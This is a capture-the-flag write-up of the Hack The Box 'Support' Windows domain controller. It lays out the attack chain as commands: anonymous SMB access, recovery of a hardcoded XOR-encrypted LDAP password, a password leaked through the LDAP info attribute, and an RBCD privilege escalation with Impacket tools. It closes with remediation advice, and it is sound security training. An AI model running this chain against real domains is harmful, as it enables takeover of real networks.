---
title: "Support — Hack The Box"
date: 2026-08-14
draft: false
tags: ["hackthebox", "windows", "active-directory", "easy", "smb-anonymous", "reverse-engineering", "ldap", "rbcd", "bloodhound"]
categories: ["writeups"]
summary: "Support starts with a custom .NET binary on an anonymous SMB share whose XOR-encrypted LDAP password unlocks the domain. An LDAP dump reveals another user's password stored in the info attribute, and BloodHound uncovers GenericAll on the DC — set up for a textbook RBCD attack."
ShowToc: true
TocOpen: false
cover:
  image: "00-card.png"
  alt: "Support — Hack The Box"
  relative: true
---

| | |
|---|---|
| **Platform** | Hack The Box |
| **Difficulty** | Easy |
| **OS** | Windows |
| **Key techniques** | Anonymous SMB, .NET decompilation (ILSpy), LDAP `info` attribute leak, GenericAll on Computer → RBCD |

---

## TL;DR

`Support` starts from an anonymously readable SMB share hosting a
`UserInfo.exe` .NET binary. Decompiling it with ILSpy reveals an LDAP
password encrypted with a hardcoded key (`armando`); reproducing the
routine in a short helper script recovers a real credential. Authenticated
LDAP dumping shows the user `support` carries a plaintext password in
the `info` attribute — that's the user flag. From there BloodHound reveals
that `support`'s group has `GenericAll` on the DC computer object, which
is the textbook setup for **Resource-Based Constrained Delegation**:
create a machine account, set it as an allowed delegate, request an
impersonation ticket for `Administrator`, and log in via `psexec -k`.

---

## Recon

```bash
sudo nmap -p- -sCV <TARGET_IP>
```

![nmap scan](01-nmap.png)

Domain controller for `support.htb` — SMB, LDAP, Kerberos, DNS, GC.

---

## SMB — anonymous share

`smbclient -L` under an anonymous session exposed the `support-tools` share
containing `UserInfo.exe`:

![smbclient enum](02-smb-enum.png)
![UserInfo download](03-userinfo-exe-download.png)
![unzip UserInfo](04-unzip-userinfo.png)

---

## Foothold — decompile + decrypt

`UserInfo.exe` is a small .NET assembly. ILSpy opened it cleanly and
surfaced the LDAP bind routine:

![Opening UserInfo.exe in ILSpy](05-ilspy-open.png)
![Decompiled LdapQuery class](06-ilspy-decompile.png)

The class held a base64-encoded ciphertext and a hardcoded key (`armando`).
The routine XORs the ciphertext against the key after decoding — trivial
to reproduce in Python/C#:

![Encrypted LDAP password](07-encrypted-password.png)
![Decrypt helper](08-decrypt-script.png)
![Cleartext LDAP password](09-decrypted-ldap.png)

---

## Lateral movement — LDAP → support

The recovered credential authenticates for LDAP queries. Dumping the full
directory surfaces every attribute — including the `info` field on the
`support` user, which contains their plaintext password:

```bash
ldapsearch -x -H ldap://<DC> -D 'ldap@support.htb' -w '<pwd>' -b 'dc=support,dc=htb'
```

![ldapsearch dump](10-ldap-search.png)
![extraction of interesting attributes](11-extract-ldap-data.png)

Password for `support`:

![support user password](12-support-password.png)

Confirmed with `nxc`:

```bash
nxc smb <DC> -u support -p 'Ironside47pleasure40Watchful'
```

![nxc valid creds](13-valid-creds.png)

WinRM login:

```bash
evil-winrm -i <DC> -u support -p 'Ironside47pleasure40Watchful'
```

![user flag](14-user-flag.png)

---

## Privilege escalation — RBCD

### BloodHound

```bash
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -c All -ns <DC>
```

![Uploading data](15-upload-bloodhound.png)
![Collecting data](16-bloodhound-collect.png)

`support` is a member of `Shared Support Accounts`, which has
`GenericAll` on the DC computer object:

![GenericAll edge](17-genericall-dc.png)
![Path to DC](18-genericall-dc-path.png)

`GenericAll` on a computer = **RBCD** playbook.

### 1. Add an attacker-controlled machine account

```bash
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Pass123!' \
  -dc-host dc.support.htb 'support.htb'/'support':'Ironside47pleasure40Watchful'
```

![Add machine](19-create-machine.png)
![Add DC$ delegate](20-add-dc-support.png)

### 2. Set it as an allowed delegate on the DC

```bash
impacket-rbcd -delegate-from 'FAKE01$' -delegate-to 'DC$' -action write \
  'support.htb'/'support':'Ironside47pleasure40Watchful'
```

![Delegation configured](21-delegation.png)
![rbcd write](22-rbcd-attack.png)

### 3. S4U → impersonation ticket for Administrator

```bash
impacket-getST -spn 'cifs/dc.support.htb' -impersonate Administrator \
  'support.htb'/'FAKE01$':'Pass123!'
export KRB5CCNAME=Administrator.ccache
```

![getST output](23-getst.png)

### 4. psexec with the ticket

```bash
impacket-psexec -k -no-pass dc.support.htb
```

![NT AUTHORITY\SYSTEM](24-nt-authority.png)
![root flag](25-root-flag.png)

---

## Lessons Learned

- **A binary on an anonymous share is a code review, not a foothold** —
  before running it, throw it into ILSpy / dnSpy / IDA. Hardcoded keys
  and encrypted config values are common.
- **LDAP `info` and `description` are goldmines.** Any authenticated
  LDAP dump should grep both — real environments still store passwords
  there.
- **`GenericAll` on a Computer object = RBCD.** The four-command chain
  (`addcomputer` → `rbcd -action write` → `getST -impersonate` →
  `psexec -k -no-pass`) is the reflex; drilling it means the exam-shape
  of this box takes minutes, not hours.


---

## Remediation

- **Disable anonymous SMB access** — remove `everyone` and null-session
  read on `support-tools` (and any share hosting binaries / installers).
  Domain-joined engineers do not need it.
- **Do not ship credentials in code, even encrypted.** The
  `UserInfo.exe` binary contained both the ciphertext *and* the XOR
  key. Move service-account authentication to Windows-integrated
  auth (LDAP over Kerberos) or gMSA — anything that keeps the
  credential out of the binary.
- **Audit LDAP `info` and `description` fields** across the whole
  directory. Passwords stored there are readable by any authenticated
  user, no ACLs applied. `ldapsearch ... '(info=*)'` finds them.
- **Restrict `GenericAll` on computer objects** — a lower-privilege
  group holding it on a Domain Controller is a direct path to
  Resource-Based Constrained Delegation. Tier-0 objects should only
  be writeable by Tier-0 accounts.
- **Disable RC4 in Kerberos** so silver/golden ticket forgeries and
  AS-REP roasting become harder; RBCD's `getST` also downgrades to
  RC4 by default and is more obvious when it is not available.

---

## Tools used

- `smbclient`
- ILSpy (.NET decompilation)
- Python (custom XOR decrypt helper)
- `ldapsearch`
- `netexec` / `nxc`
- `evil-winrm`
- `bloodhound-python` + BloodHound GUI
- Impacket (`addcomputer.py`, `rbcd.py`, `getST.py`, `psexec.py`)

---

**Also on GitHub:** [this write-up in my security portfolio (methodology & cheat sheets)](https://github.com/debasjan/security-portfolio/blob/main/writeups/hackthebox/support.md)
